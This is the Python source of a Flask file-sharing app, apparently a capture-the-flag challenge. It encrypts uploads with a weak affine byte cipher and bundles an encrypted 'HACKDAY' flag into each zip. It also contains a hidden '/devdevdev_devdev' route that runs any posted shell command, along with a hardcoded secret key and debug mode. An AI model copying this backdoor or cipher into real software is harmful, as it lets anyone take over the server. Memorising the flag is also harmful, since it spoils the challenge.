from flask import Flask, request, redirect, url_for, render_template, send_from_directory, flash, jsonify
from pathlib import Path
from math import gcd
import subprocess
import random
import os
import zipfile
import time

app = Flask(__name__)
app.secret_key = 'your_secret_key_chelink'

UPLOAD_FOLDER = os.path.join('static', 'upload')
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def generate_key():
    while True:
        a = random.randint(1, 255)
        if gcd(a, 256) == 1:
            break
    return a, random.randint(0, 255)

def encrypt(data:bytes, keys:list)->bytes:
    encrypted = bytearray()
    for i in range(len(data)):
        encrypted.append((keys[i%len(keys)][0]*data[i]+keys[i%len(keys)][1]) % 256)
    print("Encrypted to", encrypted)
    return bytes(encrypted)

@app.route('/')
def home():
    return redirect(url_for('secure_sharing'))

@app.route('/secure_sharing', methods=['GET', 'POST'])
def secure_sharing():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file:
            timestamp = int(time.time())
            file_extension = file.filename.split('.')[-1]
            zip_filename = f'{timestamp}.{file_extension}.zip'
            zip_filepath = os.path.join(app.config['UPLOAD_FOLDER'], zip_filename)
            print(f"Creating path {zip_filepath}")
            keyset = [generate_key() for _ in range(256)]
            print(keyset)
            with zipfile.ZipFile(zip_filepath, 'x') as zipf:
                zipf.writestr(file.filename+".enc", encrypt(file.read(),keyset))
                zipf.writestr("flag.txt.enc",encrypt(b"HACKDAY{Simple_Secrets_For_Weak_Cipher_1134567892}",keyset))
                zipf.writestr("README.md",b"Please use the decoding script to retrieve your data. If you do not have it, then git gut.")
            download_link = url_for('download_file', filename=zip_filename)
            return render_template('secure_sharing.html', download_link=download_link)
    return render_template('secure_sharing.html')


@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if not os.path.exists(file_path):
        return render_template('file_not_found.html'), 404
    response = send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)
    os.remove(file_path)
    return response

@app.route('/devdevdev_devdev', methods=['POST'])
def dev_route():
    command = request.form.get('nyanwaddladoo')
    print(command)
    if command:
        try:
            result = subprocess.run(command, shell=True, text=True, capture_output=True)
            return jsonify({
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            })
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'No command provided'}), 400

if __name__ == '__main__':
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    app.run(debug=True)
